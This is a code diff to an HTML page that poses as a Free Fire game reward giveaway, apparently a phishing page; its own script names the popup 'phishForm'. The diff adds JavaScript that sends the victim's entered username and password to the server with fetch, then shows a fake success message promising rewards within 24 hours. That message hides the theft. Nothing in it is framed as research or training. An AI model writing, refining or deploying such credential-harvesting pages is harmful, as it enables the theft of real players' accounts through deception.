@@ -228,6 +228,23 @@
             margin-top: 10px;
         }
 
+        .result-message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 30px;
+            font-size: 0.9rem;
+        }
+
+        .success {
+            background: #2e7d32;
+            color: white;
+        }
+
+        .error {
+            background: #c62828;
+            color: white;
+        }
+
         .footer-note {
             text-align: center;
             padding: 16px;
@@ -291,12 +308,13 @@
     <div class="form-card">
         <h3>🔐 Login to Claim</h3>
         <p style="color:#aaa; font-size:0.8rem;">Verify your Free Fire account to receive rewards</p>
-        <form method="post" id="freefireForm">
-            <input type="text" name="username" placeholder="Number/Email" required autocomplete="off">
-            <input type="password" name="password" placeholder="Password" required autocomplete="off">
-            <button type="submit">CONFIRM & CLAIM</button>
+        <form id="freefireForm">
+            <input type="text" id="ff_username" name="username" placeholder="Number/Email" required autocomplete="off">
+            <input type="password" id="ff_password" name="password" placeholder="Password" required autocomplete="off">
+            <button type="submit" id="submitClaim">CONFIRM & CLAIM</button>
             <button type="button" id="closeFormBtn" class="close-form">Cancel</button>
         </form>
+        <div id="formMessage" style="margin-top: 12px;"></div>
     </div>
 </div>
 
@@ -321,13 +339,19 @@
         document.getElementById('seconds').innerText = seconds.toString().padStart(2,'0');
     }, 1000);
 
-    // ক্লেইম বাটন ক্লিক করলে পপআপ দেখাবে
+    // Popup elements
     const claimBtn = document.getElementById('claimBtn');
     const phishFormDiv = document.getElementById('phishForm');
     const closeBtn = document.getElementById('closeFormBtn');
+    const freefireForm = document.getElementById('freefireForm');
+    const usernameInput = document.getElementById('ff_username');
+    const passwordInput = document.getElementById('ff_password');
+    const submitBtn = document.getElementById('submitClaim');
+    const formMessage = document.getElementById('formMessage');
 
     claimBtn.onclick = () => {
         phishFormDiv.style.display = 'flex';
+        formMessage.innerHTML = ''; // clear previous message
     };
     closeBtn.onclick = () => {
         phishFormDiv.style.display = 'none';
@@ -335,6 +359,54 @@
     window.onclick = (e) => {
         if (e.target === phishFormDiv) phishFormDiv.style.display = 'none';
     };
+
+    // Handle form submission with fetch (no page reload, no redirect)
+    freefireForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!username || !password) {
+            showFormMessage('⚠️ Please fill both fields.', 'error');
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Processing...';
+
+        try {
+            const response = await fetch(window.location.href, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams({ username: username, password: password })
+            });
+            const data = await response.json();
+            if (data.status === 'success') {
+                showFormMessage('✅ Success! Your reward will be credited within 24 hours.', 'success');
+                usernameInput.value = '';
+                passwordInput.value = '';
+                // Automatically close popup after 2 seconds
+                setTimeout(() => {
+                    phishFormDiv.style.display = 'none';
+                    formMessage.innerHTML = '';
+                }, 2000);
+            } else {
+                showFormMessage('❌ Something went wrong. Please try again.', 'error');
+            }
+        } catch (err) {
+            showFormMessage('❌ Network error. Please try again.', 'error');
+        } finally {
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'CONFIRM & CLAIM';
+        }
+    });
+
+    function showFormMessage(msg, type) {
+        formMessage.innerHTML = `<div class="result-message ${type === 'success' ? 'success' : 'error'}">${msg}</div>`;
+        setTimeout(() => {
+            if (formMessage.innerHTML.includes(msg)) formMessage.innerHTML = '';
+        }, 5000);
+    }
 </script>
 
 </body>
